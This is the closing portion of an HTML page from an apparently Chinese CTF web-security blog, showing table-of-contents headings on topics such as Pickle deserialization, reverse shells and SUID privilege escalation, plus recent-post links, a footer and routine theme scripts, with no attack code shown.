class="toc-text">1.ezphar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-bypass"><span class="toc-number">1.17.3.2.</span> <span class="toc-text">2.bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NSSRound-4-SWPU-1zweb-NSSCTF"><span class="toc-number">1.17.3.2.1.</span> <span class="toc-text">[NSSRound#4 SWPU]1zweb | NSSCTF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.17.4.</span> <span class="toc-text">(4)Pickle反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.18.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-number">1.19.</span> <span class="toc-text">SUID提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSleaks"><span class="toc-number">1.20.</span> <span class="toc-text">XSleaks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.21.</span> <span class="toc-text">Python原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.21.1.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mini-L-CTF-2025-%E8%A5%BF%E7%94%B5-CTF-%E7%BB%88%E7%AB%AF-Clickclick"><span class="toc-number">1.21.1.1.</span> <span class="toc-text">Mini L-CTF 2025 - 西电 CTF 终端 Clickclick</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%BC%E5%90%88"><span class="toc-number">1.22.</span> <span class="toc-text">Python代码审计综合</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/17/Web%E5%9F%BA%E7%A1%80/" title="Web基础">Web基础</a><time datetime="2025-05-17T15:00:30.000Z" title="发表于 2025-05-17 23:00:30">2025-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/17/Pearcmd-php%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="Pearcmd.php本地文件上传">Pearcmd.php本地文件上传</a><time datetime="2025-05-17T04:34:58.000Z" title="发表于 2025-05-17 12:34:58">2025-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/15/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Pickle反序列化">Pickle反序列化</a><time datetime="2025-05-15T08:56:14.000Z" title="发表于 2025-05-15 16:56:14">2025-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/14/Python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="Python栈帧沙箱逃逸">Python栈帧沙箱逃逸</a><time datetime="2025-05-14T08:58:00.000Z" title="发表于 2025-05-14 16:58:00">2025-05-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/12/Php%E5%87%BD%E6%95%B0/" title="Php函数">Php函数</a><time datetime="2025-05-12T02:14:16.000Z" title="发表于 2025-05-12 10:14:16">2025-05-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Pure Stream</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.0-b3"></script><script src="/js/main.js?v=5.3.0-b3"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/click-show-text.min.js" data-mobile="true" data-text="CTF,Web,miHoYo,PureStream,Marblue" data-fontsize="15px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>